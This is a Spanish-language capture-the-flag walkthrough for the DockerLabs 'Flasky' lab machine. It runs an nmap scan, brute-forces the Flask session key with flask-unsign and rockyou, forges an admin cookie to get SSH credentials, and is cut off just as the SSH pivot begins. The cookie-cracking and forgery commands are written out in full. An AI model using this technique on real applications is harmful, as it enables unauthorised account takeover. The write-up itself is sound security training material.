


## DESCARGA Y MONTAJE DE LA MÁQUINA VULNERABLE

Vamos a la página `https://dockerlabs.es/` y allí buscamos la máquina `Flasky`. La descargamos en nuestro kali.
1-Hacemos `unzip flasky.zip` para descomprimir el contenido, esto nos crea dos archivos:
  `auto_deploy.s` y `flasky.tar`
2-Usamos los archivos descomprimidos para montar la máquina vulnerable en un docker:
  `sudo bash auto_deploy.sh flasky.tar`

  ![CTF](images/Flasky/1.png)

## ENUMERACIÓN

Sabiendo que la IP de la máquina victima es: `172.17.0.2` vamos a realizar un escaneo de puertos, para ver 
cuales están abiertos y que servicios corren por ellos, así como sus versiones por si existe alguna vulnerabilidad para ellas.

```bash
sudo nmap -sS -sCV --open -p- --min-rate 5000 172.17.0.2 -vvv -oN nmap
```

![CTF](images/Flasky/2.png)

Descubrimos dos puertos abiertos:

-22 con SSH en versión `OpenSSH 10.0p2` no vulnerable 

-5000 con http

El puerto 22 sin credenciales ni user para conectarnos vamos a dejarlo para más adelante, así que nos centramos en el 5000


Lanzo un wharweb y un curl por si hay algo interesante y no veo gran cosa:


 ![CTF](images/Flasky/3.png)

 Abrimos la página, para ver que nos encontramos:

 
![CTF](images/Flasky/4.png)


Vemos un redireccionamiento que ya nos había reportado el whatweb, y un panel.
Vemos `INIZIALIZE NEW USER`, y vamos a crear un nuevo usuario, lo pinchamos y rellenamos:


![CTF](images/Flasky/5.png) 


y nos logeamos con el nuevo usuario:

![CTF](images/Flasky/6.png) 

vemos el panel de un usuario normal, abro las herramientas de desarrollo de firefox con `F12` e inspecciono las cookies.
veo:

```bash
session  .eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWxhB2XmIuSDYnsSwxrTQ1PV-pFgDoRRI7.ab2QdQ.L7UVJNNKxRpvrgsnWUN3Cqs-obQ
```
![CTF](images/Flasky/7.png)


es una cookie flask, nos vamos a:

```bash
https://hacktricks.wiki/es/network-services-pentesting/pentesting-web/flask.html?highlight=cookie%20flask#flask-unsign
```

y vemos que se pueden decodificar y codificar si conocemos la key, instalamos `flask-unsign` y vamos a probarlo con uestra cookie:

```bash
 flask-unsign --decode --cookie '.eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWxhB2XmIuSDYnsSwxrTQ1PV-pFgDoRRI7.ab2QdQ.L7UVJNNKxRpvrgsnWUN3Cqs-obQ'  
```
y nos decodea la cookie viendo:

```bash
{'profile': 'user', 'user_id': 3, 'username': 'lavafuego'}
```

Segun la página visitada podemos intentar sacar la key de esta manera;
```bash
flask-unsign --unsign   --cookie '.eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWxhB2XmIuSDYnsSwxrTQ1PV-pFgDoRRI7.ab2QdQ.L7UVJNNKxRpvrgsnWUN3Cqs-obQ' --wordlist /usr/share/wordlists/rockyou.txt 
```
Si os da un error hay que aplicar la flag `--no-literal-eval`

```bash
flask-unsign --unsign   --cookie '.eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWxhB2XmIuSDYnsSwxrTQ1PV-pFgDoRRI7.ab2QdQ.L7UVJNNKxRpvrgsnWUN3Cqs-obQ' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

![CTF](images/Flasky/8.png)

Ya tenemos la key:

```
secret123
```

Ahora hay que construir la cookie:

```bash
flask-unsign --sign --cookie "{'profile': 'admin', 'user_id': 1, 'username': 'admin'}" --secret 'secret123'
```
```
.eJyrViooyk_LzElVslJKTMnNzFPSUSotTi2Kz0xRsjKEsPMScxHStQCvxRDS.ab2XYg.nDMoFAZlnoGJ5lRpZ9q3bUiYfJI
```
![CTF](images/Flasky/9.png)


Ahora con la nueva cookie nos vamos a la pagina web y sustituimos la que tenemos por la nueva:

![CTF](images/Flasky/10.png)


Y ahora recargamos la página:


 ![CTF](images/Flasky/11.png)


Ya tenemos credenciales para SSH `peter:e6okFUI4`


## PIVOTAR ENTRE USUARIOS Y CONSEGUIR ESCALADA DE PRIVILEGIOS

Nos conectamos por SSH como el usuario peter:
